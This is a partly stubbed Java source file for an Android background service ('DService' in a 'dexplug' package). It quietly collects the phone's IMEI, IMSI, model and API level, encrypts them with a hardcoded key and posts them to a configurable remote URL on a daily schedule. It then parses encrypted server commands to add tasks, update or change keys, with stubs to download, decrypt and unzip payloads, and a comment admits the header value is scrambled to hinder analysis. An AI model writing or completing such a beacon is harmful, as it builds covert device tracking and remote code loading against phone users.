/**
 * 
 */
package com.k99k.dexplug;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Calendar;

import com.k99k.tools.android.StringUtil;
import com.k99k.tools.encrypter.Encrypter;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * 
 * @author tzx200
 *
 */
public class DService extends Service {

	/**
	 * 
	 */
	public DService() {
	}
	
	private static final String TAG = "DService";
	
	public static final int TYPE_NONE = 0;
	public static final int TYPE_ADD_TASK = 1;
	public static final int TYPE_DEL_TASK = 2;
	public static final int TYPE_STOP_SERVICE = 3;
	public static final int TYPE_RESTART_SERVICE = 4;
	public static final int TYPE_UPDATE = 5;
	public static final int TYPE_UPTIME = 6;
	public static final int TYPE_KEY = 7;
	
	
	private static byte[] key = new byte[]{79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
	
	private static int taskSleepTime = 30*1000;
	private static int upSleepTime = 1000*60*60*10;
	private static long nextUpTime;
	private static long lastUpTime;
	private static String upUrl = "http://127.0.0.1:8080/";
	private static int timeOut = 5000;
	private final static int VERSION = 1;
	private int keyVersion = 1;
	private static final String SPLIT_STR = "@@";
	private UpThread upThread;
	private TaskThread taskThread;
	
	public void setNextUpTime(long nextUptime,String key){
		
	}
	
	public void setUpSleepTime(int sleepTime,String key){
		
	}
	
	public void pauseService(String key){
		
	}
	
	public void killService(String key){
		
	}
	
	public String getTaskIdList(String key){
		
		return "";
	}
	
	public void removeTask(String key,int tid){
		
	}
	
	public void addTask(String key,PLTask task){
		
	}
	
	public void updateTaskState(String key,int tid,int state ){
		
	}
	
	public PLTask getTask(String key,int tid){
		
		
		return null;
	}
	
	private void reportTaskResult(String url,int tid,String info){
		
	}
	
	private void updateKey(String key){
		
	}
	
	private void updateUpTime(int startTime,int endTime,int upSleepTime,int taskSleepTime){
		
	}
	
	private boolean download(String url){
		
		
		return true;
	}
	
	private boolean deCrypt(String file){
		
		return false;
	}
	
	private boolean unzip(String file){
		

		return false;
	}
	
	private boolean moveFile(String configFile){

		return false;
	}
	
	class UpThread extends Thread{

		private boolean runFlag = true;
		
		
		/**
		 * @param runFlag the runFlag to set
		 */
		public final void setRun(boolean runFlag) {
			this.runFlag = runFlag;
		}

		private boolean up(){
			//
			
			
			try {
				StringBuilder sb = new StringBuilder();
				
				int api_level = android.os.Build.VERSION.SDK_INT;
				TelephonyManager tm=(TelephonyManager) DService.this.getSystemService(DService.TELEPHONY_SERVICE);
				String imei = tm.getDeviceId();
				String imsi = tm.getSubscriberId();
				String ua = android.os.Build.MODEL;
				sb.append(api_level).append(SPLIT_STR);
				sb.append(imei).append(SPLIT_STR);
				sb.append(imsi).append(SPLIT_STR);
				sb.append(ua).append(SPLIT_STR);
				sb.append(DService.VERSION).append(SPLIT_STR);
				sb.append(lastUpTime).append(SPLIT_STR);
				sb.append(System.currentTimeMillis()).append(SPLIT_STR);
				//DService.this.taskList;
				synchronized (DService.this.taskList) {
					for (int i = 0; i < DService.this.taskList.size(); i++) {
						PLTask t = (PLTask)DService.this.taskList.get(i);
						sb.append("_");
						sb.append(t.getTaskId());
					}
				}
				
				//Log.e(TAG, "postUrl data:"+sb.toString());
				
				String data = "up="+Encrypter.getInstance().encrypt(sb.toString());
				URL aUrl = new URL(upUrl);
			    URLConnection conn = aUrl.openConnection();
			    conn.setConnectTimeout(timeOut);
			    //header 中传keyVersion,加入算法干扰
			    conn.setRequestProperty("v", String.valueOf(DService.this.keyVersion*27+17));
			    conn.setDoInput(true);
			    conn.setDoOutput(true);
			    OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
			    wr.write(data);
			    wr.flush();

			    // Get the response
			    BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream(),"utf-8"));
			    String line;
			    sb = new StringBuilder();
				while ((line = rd.readLine()) != null) {
					sb.append(line);
				}
			    wr.close();
			    rd.close();
			    //解密
				String re = Encrypter.getInstance().decrypt(sb.toString());
				String[] res = re.split(SPLIT_STR);
				if (!StringUtil.isDigits(res[0])) {
					Log.e(TAG, "re length Error:"+re);
					return false;
				}
				int order = Integer.parseInt(res[0]);
				switch (order) {
				case TYPE_NONE:
					
					return true;
				case TYPE_ADD_TASK:
					
					
					break;
				case TYPE_DEL_TASK:
					
					
					break;
				case TYPE_KEY:
					
					
						break;
				case TYPE_UPDATE:
					
					
					break;
				case TYPE_UPTIME:
					
					
					break;
				case TYPE_RESTART_SERVICE:
					
					
					break;
				case TYPE_STOP_SERVICE:
					
					
					break;
				default:
					break;
				}
				if (order == (TYPE_NONE)) {
					return true;
				}else{
					
				}
				//比对task_id_list
				
				
				
				return true;
			} catch (IOException e) {
				Log.e(TAG, "up Error:"+upUrl, e);
			} catch (Exception e) {
				Log.e(TAG, "up unknown Error:"+upUrl, e);
			}
			return false;
		}


		@Override
		public void run() {
			
			nextUpTime = System.currentTimeMillis();
			
			try {
				while (runFlag) {
					if (System.currentTimeMillis()>nextUpTime) {
						//每天仅发起一次请求，如果请求失败，等待10分钟
						if (this.up()) {
							Calendar ca = Calendar.getInstance();
							ca.add(Calendar.DATE, 1);
							ca.set(Calendar.HOUR_OF_DAY, 6);
							nextUpTime = ca.getTimeInMillis();
							lastUpTime = System.currentTimeMillis();
						}
					}
					Thread.sleep(upSleepTime);
				}
			} catch (InterruptedException e) {
			}
		}
		
	}

	private ArrayList<PLTask> taskList = new ArrayList<PLTask>();
	
	class TaskThread extends Thread{
	
		private boolean runFlag = true;
		
		public void addTask(PLTask task){
			DService.this.taskList.add(task);
		}
		
		public void delTask(int taskId){
			for (int i = 0; i < taskList.size(); i++) {
				PLTask t = (PLTask)taskList.get(i);
				if (t.getTaskId() == taskId) {
					taskList.remove(t);
				}
			}
		}
		
		@Override
		public void run() {
			try {
				while (runFlag) {

					
					
					Thread.sleep(taskSleepTime);
				}
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		

		/**
		 * @param runFlag the runFlag to set
		 */
		public final void setRun(boolean runFlag) {
			this.runFlag = runFlag;
		}

	}
	
	
	private void init(){
		Encrypter.setKey(key);
		if (this.upThread != null || this.taskThread!=null) {
			this.upThread.setRun(false);
			this.taskThread.setRun(false);
			try {
				Thread.sleep(10*1000);
			} catch (InterruptedException e) {
			}
		}
		this.upThread = new UpThread();
		this.upThread.start();
		this.taskThread = new TaskThread();
		this.taskThread.start();
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onBind(android.content.Intent)
	 */
	@Override
	public IBinder onBind(Intent intent) {
		
		return null;
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onCreate()
	 */
	@Override
	public void onCreate() {
		Log.d(TAG, "dservice created...");
		this.init();
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onDestroy()
	 */
	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		Log.d(TAG, "dservice destroy...");
	}


	/* (non-Javadoc)
	 * @see android.app.Service#onStartCommand(android.content.Intent, int, int)
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		Log.d(TAG, "dservice onStartCommand...");
		
		
		
		return super.onStartCommand(intent, flags, startId);
	}

	/**
	 * @return the version
	 */
	public final int getVersion() {
		return VERSION;
	}

	/**
	 * @return the keyVersion
	 */
	public final int getKeyVersion() {
		return keyVersion;
	}

	/**
	 * @param keyVersion the keyVersion to set
	 */
	public final void setKeyVersion(int keyVersion) {
		this.keyVersion = keyVersion;
	}

	/**
	 * @return the upUrl
	 */
	public static final String getUpUrl() {
		return upUrl;
	}

	/**
	 * @param upUrl the upUrl to set
	 */
	public static final void setUpUrl(String upUrl) {
		DService.upUrl = upUrl;
	}

}
